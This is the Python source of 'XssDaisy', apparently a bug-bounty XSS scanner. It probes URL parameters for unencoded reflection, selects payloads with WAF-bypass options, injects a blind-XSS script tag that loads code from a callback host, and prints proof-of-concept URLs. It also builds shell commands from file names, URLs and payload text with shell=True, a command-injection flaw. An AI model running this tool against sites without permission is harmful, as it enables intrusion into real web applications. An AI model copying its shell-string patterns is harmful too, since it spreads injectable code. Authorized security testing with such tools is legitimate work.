#!/usr/bin/env python3
# ╔══════════════════════════════════════════════════════════════╗
# ║              XssDaisy - XSS Scanner Framework                ║
# ║           Author: KaisarYetiandi | Bug Bounty Tool           ║
# ║      GitHub: github.com/KaisarYetiandi | t.me/Darkness_Lock  ║
# ╚══════════════════════════════════════════════════════════════╝

import os, sys, re, json, time, random, hashlib, subprocess, string
import requests
import urllib3
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from optparse import OptionParser
from Header import Parser
from adder import Adder
from Waf import Waf_Detect
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn
from rich.text import Text
from rich.live import Live
from rich.layout import Layout
from rich import box
from rich.markup import escape
import threading

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

console = Console()
lock = threading.Lock()

BANNER = r"""
[bold #b060ff]
██╗  ██╗███████╗███████╗██████╗  █████╗ ██╗███████╗██╗   ██╗
╚██╗██╔╝██╔════╝██╔════╝██╔══██╗██╔══██╗██║██╔════╝╚██╗ ██╔╝
 ╚███╔╝ ███████╗███████╗██║  ██║███████║██║███████╗ ╚████╔╝
 ██╔██╗ ╚════██║╚════██║██║  ██║██╔══██║██║╚════██║  ╚██╔╝
██╔╝ ██╗███████║███████║██████╔╝██║  ██║██║███████║   ██║
╚═╝  ╚═╝╚══════╝╚══════╝╚═════╝ ╚═╝  ╚═╝╚═╝╚══════╝   ╚═╝
[/bold #b060ff]

[#6e40c9]╔══════════════════════════════════════════════════════════════════════╗[/#6e40c9]
[#6e40c9]║[/#6e40c9]                 [bold white]XSS Scanner Framework v3.0[/bold white]                           [#6e40c9]║[/#6e40c9]
[#6e40c9]╠══════════════════════════════════════════════════════════════════════╣[/#6e40c9]
[#6e40c9]║[/#6e40c9]  [bold white]Author   :[/bold white] KaisarYetiandi                                           [#6e40c9]║[/#6e40c9]
[#6e40c9]║[/#6e40c9]  [bold white]GitHub   :[/bold white] github.com/KaisarYetiandi                                [#6e40c9]║[/#6e40c9]
[#6e40c9]║[/#6e40c9]  [bold white]Telegram :[/bold white] t.me/Darkness_Lock                                       [#6e40c9]║[/#6e40c9]
[#6e40c9]║[/#6e40c9]  [bold white]Status   :[/bold white] Authorized Use Only                                      [#6e40c9]║[/#6e40c9]
[#6e40c9]╚══════════════════════════════════════════════════════════════════════╝[/#6e40c9]
"""


def clear_and_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    console.print(BANNER)

parser = OptionParser(add_help_option=False)
parser.add_option('-h', '--help',      dest='help',       action='store_true', help='Show this help message')
parser.add_option('-u', dest='url',    help='Single URL  e.g. http://site.com/?id=1')
parser.add_option('-f', dest='filename', help='File with URLs (one per line)')
parser.add_option('-o', dest='output', help='Output file  e.g. results.txt')
parser.add_option('-t', dest='threads', help='Threads (max 10, default 1)')
parser.add_option('-H', dest='headers', help='Custom headers  e.g. "X-Foo: bar,Cookie: s=abc"')
parser.add_option('--waf', dest='waf', action='store_true', help='Auto-detect WAF then pick matching payloads')
parser.add_option('-w', dest='custom_waf', help='Force specific WAF payloads  e.g. cloudflare')
parser.add_option('--crawl', dest='crawl', action='store_true', help='Crawl URL with katana then scan')
parser.add_option('--pipe', dest='pipe', action='store_true', help='Accept piped URLs from stdin')
parser.add_option('--post', dest='post', action='store_true', help='Send payloads via POST body')
parser.add_option('--cookie', dest='cookie', help='Custom cookie  e.g. "session=abc123"')
parser.add_option('--proxy', dest='proxy', help='HTTP/HTTPS proxy  e.g. http://127.0.0.1:8080')
parser.add_option('--delay', dest='delay', type='float', default=0, help='Delay between requests in seconds')
parser.add_option('--blind', dest='blind', help='Blind XSS callback URL  e.g. https://your.burp.collab')
parser.add_option('--timeout', dest='timeout', type='int', default=10, help='Request timeout (default 10s)')
parser.add_option('--report', dest='report', help='Save HTML report  e.g. report.html')
parser.add_option('--level', dest='level', type='int', default=1, help='Scan level 1-3 (default 1)')

val, args = parser.parse_args()

if val.help or len(sys.argv) == 1:
    clear_and_banner()
    console.print(Panel(
        "[bold #b060ff]Usage:[/bold #b060ff]\n"
        "  [cyan]python main.py -u http://site.com/?id=1[/cyan]\n"
        "  [cyan]python main.py -f urls.txt -t 5 -o results.txt[/cyan]\n"
        "  [cyan]python main.py -u http://site.com/?id=1 --waf[/cyan]\n"
        "  [cyan]python main.py -u http://site.com/?id=1 --proxy http://127.0.0.1:8080[/cyan]\n"
        "  [cyan]python main.py -u http://site.com/?id=1 --blind https://xyz.oast.fun[/cyan]\n\n"
        "[bold #b060ff]Options:[/bold #b060ff]\n"
        "  [white]-u[/white]         Single target URL\n"
        "  [white]-f[/white]         File containing URLs\n"
        "  [white]-o[/white]         Output file for results\n"
        "  [white]-t[/white]         Threads (max 10)\n"
        "  [white]-H[/white]         Custom headers (comma-separated)\n"
        "  [white]--waf[/white]      Auto-detect and bypass WAF\n"
        "  [white]-w[/white]         Force WAF payloads (cloudflare/imperva/etc)\n"
        "  [white]--crawl[/white]    Crawl target with katana first\n"
        "  [white]--pipe[/white]     Accept stdin input\n"
        "  [white]--post[/white]     Test via POST body parameters\n"
        "  [white]--cookie[/white]   Attach cookie string\n"
        "  [white]--proxy[/white]    Route through HTTP proxy\n"
        "  [white]--delay[/white]    Delay between requests (seconds)\n"
        "  [white]--blind[/white]    Blind XSS callback URL\n"
        "  [white]--timeout[/white]  Request timeout in seconds\n"
        "  [white]--report[/white]   Save HTML report\n"
        "  [white]--level[/white]    Scan depth 1=basic 2=deep 3=aggressive",
        title="[bold #b060ff]XssDaisy[/bold #b060ff] [white]Help[/white]",
        border_style="#6e40c9"
    ))
    sys.exit(0)

clear_and_banner()

filename    = val.filename
threads     = min(int(val.threads or 1), 10)
output      = val.output
url         = val.url
crawl       = val.crawl
waf         = val.waf
pipe        = val.pipe
custom_waf  = val.custom_waf
cookie      = val.cookie
proxy       = val.proxy
delay       = val.delay
blind       = val.blind
timeout     = val.timeout
report_path = val.report
level       = val.level
post_mode   = val.post
headers     = {}

try:
    if val.headers:
        headers = Parser.headerParser(val.headers.split(','))
except Exception:
    pass

if cookie:
    headers['Cookie'] = cookie

proxies = {'http': proxy, 'https': proxy} if proxy else None

if crawl and url:
    filename = f"{url.split('://')[1].split('/')[0]}_katana"


def info(msg):
    console.print(f"[bold #6e40c9][[/bold #6e40c9][bold white]*[/bold white][bold #6e40c9]][/bold #6e40c9] {msg}")

def success(msg):
    console.print(f"[bold #39ff14][[/bold #39ff14][bold white]+[/bold white][bold #39ff14]][/bold #39ff14] [bold #39ff14]{msg}[/bold #39ff14]")

def vuln(msg):
    console.print(Panel(f"[bold red]{msg}[/bold red]", border_style="red", title="[bold red]VULNERABLE[/bold red]"))

def warn(msg):
    console.print(f"[bold yellow][[/bold yellow][bold white]![/bold white][bold yellow]][/bold yellow] [yellow]{msg}[/yellow]")

def safe(msg):
    console.print(f"[bold #444][[/bold #444][white]-[/white][bold #444]][/bold #444] [dim]{msg}[/dim]")


class XssDaisy:

    def __init__(self, url=None, filename=None, output=None, headers=None):
        self.filename = filename
        self.url = url
        self.output = output
        self.headers = headers or {}
        self.result = []
        self._baseline_cache = {}

    def _get(self, url, params=None, data=None):
        try:
            if delay:
                time.sleep(delay)
            if post_mode and data:
                r = requests.post(url, data=data, headers=self.headers,
                                  proxies=proxies, verify=False, timeout=timeout, allow_redirects=True)
            else:
                r = requests.get(url, params=params, headers=self.headers,
                                 proxies=proxies, verify=False, timeout=timeout, allow_redirects=True)
            return r
        except requests.exceptions.Timeout:
            return None
        except Exception:
            return None

    def read(self, filename):
        info(f"Reading URLs from [bold cyan]{filename}[/bold cyan]")
        try:
            urls = subprocess.check_output(
                f"cat {filename} | grep '=' | sort -u", shell=True
            ).decode('utf-8', errors='ignore')
        except Exception:
            warn(f"Could not read {filename}")
            return []
        if not urls.strip():
            warn("No URLs with GET parameters found.")
            return []
        return urls.split()

    def write(self, output, value):
        if not output:
            return
        subprocess.call(f"echo '{value}' >> {output}", shell=True)

    def crawl(self):
        info(f"Crawling [bold cyan]{url}[/bold cyan] with katana ...")
        try:
            subprocess.check_output(
                f"katana -u {url} -jc -d 4 -o {url.split('://')[1].split('/')[0]}_katana",
                shell=True
            )
        except Exception as e:
            warn(f"Crawl error: {e}")

    def parameters(self, url):
        params = parse_qs(urlparse(url).query, keep_blank_values=True)
        return list(params.keys())

    def build_url(self, url, param, value):
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[param] = [value]
        new_query = urlencode(params, doseq=True)
        return urlunparse(parsed._replace(query=new_query))

    def base_url(self, url):
        p = urlparse(url)
        return urlunparse(p._replace(query='', fragment=''))

    def flat_params(self, url):
        return {k: v[0] for k, v in parse_qs(urlparse(url).query, keep_blank_values=True).items()}

    def _baseline(self, url, param):
        """Send a benign unique marker and record the baseline response."""
        key = f"{url}::{param}"
        if key in self._baseline_cache:
            return self._baseline_cache[key]
        marker = "xdaisy" + ''.join(random.choices(string.ascii_lowercase, k=6))
        params = self.flat_params(url)
        params[param] = marker
        r = self._get(self.base_url(url), params=params)
        result = {
            'marker': marker,
            'reflected': r is not None and marker in (r.text if r else ''),
            'status':   r.status_code if r else 0,
            'length':   len(r.text) if r else 0,
        }
        self._baseline_cache[key] = result
        return result

    def _is_html_response(self, response):
        ct = response.headers.get('Content-Type', '')
        return 'text/html' in ct or 'application/xhtml' in ct

    def _is_encoded(self, payload, response_text):
        """Return True if all dangerous chars are HTML-encoded (false positive)."""
        dangerous = ['<', '>', '"', "'", '/']
        encoded_map = {
            '<': ['&lt;', '&#60;', '&#x3c;', '&#x3C;'],
            '>': ['&gt;', '&#62;', '&#x3e;', '&#x3E;'],
            '"': ['&quot;', '&#34;', '&#x22;'],
            "'": ['&#39;', '&#x27;', '&apos;'],
            '/': ['&#47;', '&#x2f;', '&#x2F;'],
        }
        for char in dangerous:
            if char in payload:
                raw_present = char in response_text
                enc_present = any(enc in response_text for enc in encoded_map[char])
                if enc_present and not raw_present:
                    return True
        return False

    def _context_check(self, payload, response_text):
        """
        Verify the payload appears in an exploitable context,
        not inside a safe zone (comment, encoded attr, etc.).
        Returns (is_exploitable, context_type)
        """
        if payload not in response_text:
            return False, "not_reflected"

        idx = response_text.find(payload)
        surrounding = response_text[max(0, idx-50):idx+len(payload)+50]


        if '<!--' in surrounding[:50] and '-->' in surrounding[len(payload):]:
            return False, "html_comment"

        if '<' in payload and '&lt;' not in response_text[idx:idx+len(payload)+10]:
            return True, "tag_injection"
        if 'onerror=' in payload.lower() or 'onload=' in payload.lower() or 'onclick=' in payload.lower():
            return True, "event_handler"
        if 'javascript:' in payload.lower():
            return True, "js_scheme"
        if 'alert' in payload or 'prompt' in payload or 'confirm' in payload:
            return True, "js_execution"

        return True, "reflected"

    def _verify_reflection(self, url, param, payload):
        """
        Core false-positive filter.
        1. Content-type must be HTML
        2. Payload must be in raw form (not encoded)
        3. Context must be exploitable
        4. Response status 200
        Returns (bool, context_type)
        """
        params = self.flat_params(url)
        params[param] = payload
        r = self._get(self.base_url(url), params=params)
        if not r:
            return False, "no_response"
        if r.status_code != 200:
            return False, f"status_{r.status_code}"
        if not self._is_html_response(r):
            return False, "non_html"
        if self._is_encoded(payload, r.text):
            return False, "html_encoded"
        exploitable, ctx = self._context_check(payload, r.text)
        return exploitable, ctx

    def probe_chars(self, url, param):
        """
        Probe which dangerous characters reflect unencoded.
        Returns list of reflected-unencoded chars.
        """
        dangerous = Adder().dangerous_characters
        reflected = []
        for char in dangerous:
            marker = f"xd{char}xd"
            params = self.flat_params(url)
            params[param] = marker
            r = self._get(self.base_url(url), params=params)
            if r and r.status_code == 200:
                if char in r.text and not self._is_encoded(char, r.text):
                    reflected.append(char)
        return reflected

    def filter_payloads(self, reflected_chars, firewall):
        payload_list = []
        dbs = json.load(open("payloads.json"))

        # Filter by WAF
        if firewall:
            waf_dbs = [p for p in dbs if p.get('waf') == firewall.lower()]
            generic  = [p for p in dbs if not p.get('waf')]
            dbs = waf_dbs + generic if waf_dbs else generic
        else:
            dbs = [p for p in dbs if not p.get('waf')]

        if not dbs:
            warn("No matching payloads found.")
            return []
        
        for p in dbs:
            p['_score'] = sum(1 for c in p['Attribute'] if c in reflected_chars)

        if blind:
            dbs.insert(0, {
                "Payload": f"\"><script src='{blind}'></script>",
                "Attribute": ['<', '>', '"', '/'],
                "_score": 99,
                "waf": firewall
            })

        dbs.sort(key=lambda x: x['_score'], reverse=True)

        for p in dbs:
            attrs = p.get('Attribute', [])
            score = p.get('_score', 0)
            if not attrs:
                continue 
            if score >= max(1, len(attrs) // 2):
                payload_list.append(p['Payload'].strip())

        limits = {1: 20, 2: 50, 3: len(payload_list)}
        return payload_list[:limits.get(level, 20)]

    def scanner(self, target_url):
        target_url = target_url.strip()
        if not target_url:
            return

        with lock:
            info(f"Scanning [bold cyan]{escape(target_url)}[/bold cyan]")

        firewall = None
        if waf:
            with lock:
                info("Detecting WAF ...")
            firewall = Waf_Detect(target_url).waf_detect()
            with lock:
                if firewall:
                    success(f"WAF detected: [bold red]{firewall.upper()}[/bold red]")
                else:
                    info("No WAF detected — using generic payloads")
        elif custom_waf:
            firewall = custom_waf.lower()
            with lock:
                info(f"Forced WAF mode: [bold yellow]{firewall}[/bold yellow]")

        params = self.parameters(target_url)
        if not params:
            with lock:
                warn(f"No GET parameters in: {escape(target_url)}")
            return

        with lock:
            info(f"Parameters found: [bold white]{', '.join(params)}[/bold white]")

        for param in params:
            with lock:
                info(f"Probing parameter: [bold magenta]{param}[/bold magenta]")

            reflected_chars = self.probe_chars(target_url, param)

            if not reflected_chars:
                with lock:
                    safe(f"No dangerous chars reflect in '{param}' — skipping")
                continue

            with lock:
                success(f"Reflected chars in '{param}': [bold white]{reflected_chars}[/bold white]")

            payloads = self.filter_payloads(reflected_chars, firewall)
            if not payloads:
                with lock:
                    warn(f"No suitable payloads for '{param}'")
                continue

            with lock:
                info(f"Testing [bold white]{len(payloads)}[/bold white] payloads on [bold magenta]{param}[/bold magenta]")

            found = False
            for payload in payloads:
                exploitable, ctx = self._verify_reflection(target_url, param, payload)

                if exploitable:
                    vuln_url = self.build_url(target_url, param, payload)
                    with lock:
                        vuln(
                            f"URL       : {target_url}\n"
                            f"Parameter : {param}\n"
                            f"Context   : {ctx}\n"
                            f"Payload   : {payload}\n"
                            f"PoC URL   : {vuln_url}"
                        )
                        self.result.append({
                            'url': target_url,
                            'param': param,
                            'payload': payload,
                            'context': ctx,
                            'poc': vuln_url
                        })
                        self.write(output, vuln_url)
                    found = True
                    break 

            if not found:
                with lock:
                    safe(f"'{param}' — not vulnerable (all payloads filtered)")

    def generate_report(self, path):
        if not self.result:
            warn("No vulnerabilities found — no report generated.")
            return
        rows = ""
        for i, r in enumerate(self.result, 1):
            rows += f"""
            <tr>
                <td>{i}</td>
                <td>{r['url']}</td>
                <td>{r['param']}</td>
                <td><code>{r['payload']}</code></td>
                <td><span class="ctx">{r['context']}</span></td>
                <td><a href="{r['poc']}" target="_blank">PoC</a></td>
            </tr>"""
        html = f"""<!DOCTYPE html>
<html><head><meta charset="utf-8">
<title>XssDaisy Report</title>
<style>
  body{{background:#0d0d1a;color:#ccc;font-family:'JetBrains Mono',monospace;padding:20px}}
  h1{{color:#b060ff;text-align:center}}
  .sub{{color:#6e40c9;text-align:center;margin-bottom:20px}}
  table{{width:100%;border-collapse:collapse;background:#12122a}}
  th{{background:#1e0050;color:#b060ff;padding:10px}}
  td{{padding:8px 10px;border-bottom:1px solid #1e1e3a;color:#eee;word-break:break-all}}
  tr:hover td{{background:#1a1a35}}
  code{{color:#39ff14;background:#0a0a15;padding:2px 5px;border-radius:3px}}
  a{{color:#00d4ff}} .ctx{{color:#ff9944}}
</style></head>
<body>
  <h1>XssDaisy Scan Report</h1>
  <p class="sub">Author: KaisarYetiandi | github.com/KaisarYetiandi | t.me/Darkness_Lock</p>
  <table>
    <tr><th>#</th><th>URL</th><th>Parameter</th><th>Payload</th><th>Context</th><th>PoC</th></tr>
    {rows}
  </table>
</body></html>"""
        with open(path, 'w') as f:
            f.write(html)
        success(f"HTML report saved: [bold cyan]{path}[/bold cyan]")
    def summary(self):
        tbl = Table(
            title="[bold #b060ff]XssDaisy — Scan Summary[/bold #b060ff]",
            box=box.DOUBLE_EDGE,
            border_style="#6e40c9",
            header_style="bold #b060ff"
        )
        tbl.add_column("#",         style="dim", width=4)
        tbl.add_column("Parameter", style="bold magenta")
        tbl.add_column("Context",   style="yellow")
        tbl.add_column("Payload",   style="bold green", max_width=50)
        tbl.add_column("PoC URL",   style="cyan", max_width=60)

        for i, r in enumerate(self.result, 1):
            tbl.add_row(str(i), r['param'], r['context'], r['payload'][:48], r['poc'][:58])

        console.print(tbl)
        console.print(
            f"\n[bold #6e40c9]Total vulnerable:[/bold #6e40c9] [bold red]{len(self.result)}[/bold red]\n"
            f"[dim]Author: KaisarYetiandi | github.com/KaisarYetiandi | t.me/Darkness_Lock[/dim]"
        )

if __name__ == "__main__":
    Scanner = XssDaisy(filename=filename, output=output, headers=headers)
    urls = []

    try:
        if url and not filename:
            Scanner.url = url
            Scanner.scanner(url)
        elif filename and crawl:
            Scanner.crawl()
            urls = Scanner.read(filename)
        elif pipe:
            urls = [u.strip() for u in sys.stdin if u.strip()]
        elif filename:
            urls = Scanner.read(filename)
        else:
            warn("No target specified. Use -u or -f. Try --help.")
            sys.exit(1)

        if urls:
            info(f"Loaded [bold white]{len(urls)}[/bold white] URLs | Threads: [bold white]{threads}[/bold white]")
            with ThreadPoolExecutor(max_workers=threads) as executor:
                futures = {executor.submit(Scanner.scanner, u): u for u in urls}
                for f in as_completed(futures):
                    pass 

    except KeyboardInterrupt:
        warn("\nInterrupted by user.")
    except Exception as e:
        warn(f"Error: {e}")
    finally:
        console.rule("[bold #6e40c9]Scan Complete[/bold #6e40c9]")
        Scanner.summary()
        if report_path:
            Scanner.generate_report(report_path)
